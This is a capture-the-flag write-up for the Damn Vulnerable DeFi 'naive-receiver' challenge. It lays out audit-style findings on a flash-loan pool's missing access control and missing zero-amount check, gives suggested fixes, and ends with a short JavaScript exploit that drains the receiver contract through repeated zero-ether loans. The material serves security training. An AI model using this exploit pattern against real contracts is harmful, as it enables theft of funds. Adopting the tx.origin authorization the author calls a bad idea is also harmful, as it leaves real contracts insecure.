# Damn Vulnerable DeFi

Damn Vulnerable DeFi is the wargame to learn offensive security of DeFi smart contracts.

Throughout numerous challenges you will build the skills to become a bug hunter or security auditor in the space.

https://www.damnvulnerabledefi.xyz/

# Introduction

naive-receiver is the second challenge in the Damn Vulnerable DeFi series.

Challenge description: 
There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

Challenge goal:
Transfer all the ether in the FlashLoanReceiver contract to NaiveReceiverLender contract.

# Findings 

## Critical Risk
### No Access Control

**Context:** [`FlashLoanReceiver.sol#L21-L32`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/contracts/naive-receiver/FlashLoanReceiver.sol) and [`NaiveReceiverLenderPool.sol#L21-L41`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/contracts/naive-receiver/NaiveReceiverLenderPool.sol)

**Description:**
NaiveReceiverLenderPool contract does not check who is calling the flashLoan function and FlashLoanReceiver only checks if the msg.sender is pool, so anybody can take flash loans on behalf of FlashLoanReceiver contract.

```solidity
function receiveEther(uint256 fee) public payable {
    require(msg.sender == pool, "Sender must be pool");

    uint256 amountToBeRepaid = msg.value + fee;

    require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
        
    _executeActionDuringFlashLoan();
        
    // Return funds to pool
    pool.sendValue(amountToBeRepaid);
}
```
**Disclaimer:** using tx.origin for authorization is a bad idea, but it's the only way I found without changing the whole flash loan logic.
**Recommendation:**
flashLoanReceiver should designate trusted address-es and check if tx.origin is trusted in receiveEther function.

```diff
+ address trustedAddress;
+ require(tx.origin == trustedAddress, "only trusted address can initiate loans");
- 
```

## Medium Risk
### No zero borrowAmount check

**Context:** [`NaiveReceiverLenderPool.sol#L21-L41`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/contracts/naive-receiver/NaiveReceiverLenderPool.sol)

**Description:** 
flashLoan function in NaiveReceiverLenderPool contract does not check if the borrowAmount is nonzero which can lead to users paying fees for nothing(zero ether loans).

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

    uint256 balanceBefore = address(this).balance;
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


    require(borrower.isContract(), "Borrower must be a deployed contract");
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            "receiveEther(uint256)",
            FIXED_FEE
        ),
        borrowAmount
    );
        
    require(
        address(this).balance >= balanceBefore + FIXED_FEE,
        "Flash loan hasn't been paid back"
    );
}
```

**Recommendation:**
flashLoan function should check if the borrowAmount is nonzero.

```diff
+ require(borrowAmount > 0, "borrowAmount must be nonzero");
-
```

# How To Solve The Challenge
take 10 zero ether flash loans on behalf of FlashLoanReceiver contract.

**Context:** [`naive-receiver.challenge.js#L32-L36`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/test/naive-receiver/naive-receiver.challenge.js)

```javascript
it('Exploit', async function () {
    for (let i = 0; i < 10; i++) {
        await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
    }
});
```